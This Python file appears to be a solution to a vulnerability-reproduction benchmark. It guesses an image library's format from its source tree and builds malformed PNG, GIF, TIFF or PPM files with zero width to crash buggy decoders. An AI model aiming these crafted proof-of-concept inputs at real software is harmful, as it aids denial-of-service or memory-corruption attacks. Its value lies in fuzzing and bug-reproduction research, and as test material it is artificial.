import os
import re
import tarfile
import struct
import binascii
import zlib
from typing import Dict, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_likely_format(src_path)
        if fmt == "gif":
            return self._poc_gif_w0_h1()
        if fmt == "tiff":
            return self._poc_tiff_w0_h1()
        if fmt == "pnm":
            return self._poc_pnm_p6_w0_h1()
        return self._poc_png_w0_h1()

    def _detect_likely_format(self, src_path: str) -> str:
        scores = {"png": 0, "gif": 0, "tiff": 0, "pnm": 0}
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    if not self._is_text_source_file(fn):
                        continue
                    try:
                        if os.path.getsize(p) > 512_000:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    self._score_text(data, fn, scores)
            return self._pick(scores)

        try:
            with tarfile.open(src_path, "r:*") as tf:
                total_read = 0
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name.rsplit("/", 1)[-1]
                    if not self._is_text_source_file(name):
                        continue
                    if m.size > 512_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        total_read += len(data)
                    except Exception:
                        continue
                    self._score_text(data, name, scores)
                    if total_read > 4_000_000:
                        break
        except Exception:
            return "png"
        return self._pick(scores)

    def _pick(self, scores: Dict[str, int]) -> str:
        if scores["png"] <= 0 and scores["gif"] <= 0 and scores["tiff"] <= 0 and scores["pnm"] <= 0:
            return "png"
        # Prefer PNG on ties since it's most common in generic image loaders
        order = ["png", "gif", "tiff", "pnm"]
        best = max(order, key=lambda k: (scores[k], -order.index(k)))
        return best

    def _is_text_source_file(self, filename: str) -> bool:
        fn = filename.lower()
        exts = (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
            ".py", ".js", ".ts", ".cmake", ".txt", ".md"
        )
        return fn.endswith(exts) or ("fuzz" in fn and not fn.endswith((".a", ".o", ".so", ".dll", ".exe", ".png", ".gif", ".tif", ".tiff", ".jpg", ".jpeg")))

    def _score_text(self, data: bytes, filename: str, scores: Dict[str, int]) -> None:
        low = data.lower()
        fname = filename.lower()

        def add(key: str, val: int) -> None:
            scores[key] += val

        if b"llvmfuzzertestoneinput" in low:
            add("png", 10)
            add("gif", 6)
            add("tiff", 6)
            add("pnm", 4)

        if b"stbi_load" in low or b"stbi__" in low or b"stb_image" in low:
            add("png", 25)

        if b"png" in low or b"ihdr" in low or b"idat" in low or b"iendl" in low:
            add("png", 8)
        if b"lodepng" in low or b"spng" in low or b"libpng" in low or b"png_read_info" in low:
            add("png", 20)
        if "png" in fname:
            add("png", 6)

        if b"gif" in low or b"gif89a" in low or b"dgifopen" in low or b"egifopen" in low:
            add("gif", 12)
        if "gif" in fname:
            add("gif", 5)

        if b"tiff" in low or b"libtiff" in low or b"tif" in low or b"tiffopen" in low:
            add("tiff", 12)
        if "tif" in fname or "tiff" in fname:
            add("tiff", 5)

        if b"ppm" in low or b"pgm" in low or b"pnm" in low or b"pbm" in low:
            add("pnm", 10)
        if "pnm" in fname or "ppm" in fname or "pgm" in fname or "pbm" in fname:
            add("pnm", 4)

        # Heuristic: if code explicitly references "filter byte" or unfiltering, likely PNG
        if b"unfilter" in low or b"filter byte" in low or b"paeth" in low:
            add("png", 12)

    def _poc_png_w0_h1(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"

        def chunk(typ: bytes, data: bytes) -> bytes:
            crc = binascii.crc32(typ)
            crc = binascii.crc32(data, crc) & 0xFFFFFFFF
            return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)

        width = 0
        height = 1
        bit_depth = 8
        color_type = 6  # RGBA
        compression = 0
        filter_method = 0
        interlace = 0
        ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)

        raw = b"\x00"  # filter byte only (rowbytes=0)
        comp = zlib.compress(raw, 9)
        return sig + chunk(b"IHDR", ihdr_data) + chunk(b"IDAT", comp) + chunk(b"IEND", b"")

    def _poc_gif_w0_h1(self) -> bytes:
        # Minimal GIF89a with width=0, height=1, 2-color GCT, single image, minimal LZW stream (clear+end)
        hdr = b"GIF89a"
        width = 0
        height = 1
        packed = 0b10000000  # GCT present, color resolution 0, sort 0, GCT size 2 colors
        bg = 0
        aspect = 0
        lsd = struct.pack("<HHBBB", width, height, packed, bg, aspect)
        gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"  # black, white
        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, width, height, 0)
        lzw_min = b"\x02"
        # With min code size 2: clear=4, end=5, initial code size 3, codes: 4,5 => bits LSB-first => 0x2C
        img_data = b"\x01" + b"\x2C" + b"\x00"
        trailer = b"\x3B"
        return hdr + lsd + gct + img_desc + lzw_min + img_data + trailer

    def _poc_tiff_w0_h1(self) -> bytes:
        # Minimal little-endian TIFF with width=0, height=1, uncompressed, 8bpp grayscale, 1 strip, 1 byte data.
        # Some buggy readers may allocate based on width/height and still read/decode strip data.
        endian = b"II"
        magic = struct.pack("<H", 42)
        ifd_offset = struct.pack("<I", 8)

        entries = []

        def tag_entry(tag: int, typ: int, count: int, value: int) -> bytes:
            # value is placed directly if fits in 4 bytes
            return struct.pack("<HHI", tag, typ, count) + struct.pack("<I", value)

        # Types: 3=SHORT, 4=LONG
        entries.append(tag_entry(256, 4, 1, 0))  # ImageWidth = 0
        entries.append(tag_entry(257, 4, 1, 1))  # ImageLength = 1
        entries.append(tag_entry(258, 3, 1, 8))  # BitsPerSample = 8
        entries.append(tag_entry(259, 3, 1, 1))  # Compression = 1
        entries.append(tag_entry(262, 3, 1, 1))  # PhotometricInterpretation = 1
        # StripOffsets and StripByteCounts filled after calculating positions
        # SamplesPerPixel, RowsPerStrip
        entries.append(tag_entry(277, 3, 1, 1))  # SamplesPerPixel = 1
        entries.append(tag_entry(278, 4, 1, 1))  # RowsPerStrip = 1

        # We'll include StripOffsets and StripByteCounts
        # Total IFD size: 2 + N*12 + 4
        # We'll append the two strip-related entries at the end for stable offsets.
        n_base = len(entries) + 2
        ifd_size = 2 + n_base * 12 + 4
        data_offset = 8 + ifd_size

        strip_offset = data_offset
        strip_bytecounts = 1

        entries.append(tag_entry(273, 4, 1, strip_offset))      # StripOffsets
        entries.append(tag_entry(279, 4, 1, strip_bytecounts))   # StripByteCounts

        num_entries = struct.pack("<H", len(entries))
        next_ifd = struct.pack("<I", 0)
        ifd = num_entries + b"".join(entries) + next_ifd

        pixel_data = b"\x00"
        return endian + magic + ifd_offset + ifd + pixel_data

    def _poc_pnm_p6_w0_h1(self) -> bytes:
        # Minimal binary PPM with width=0, height=1
        return b"P6\n0 1\n255\n"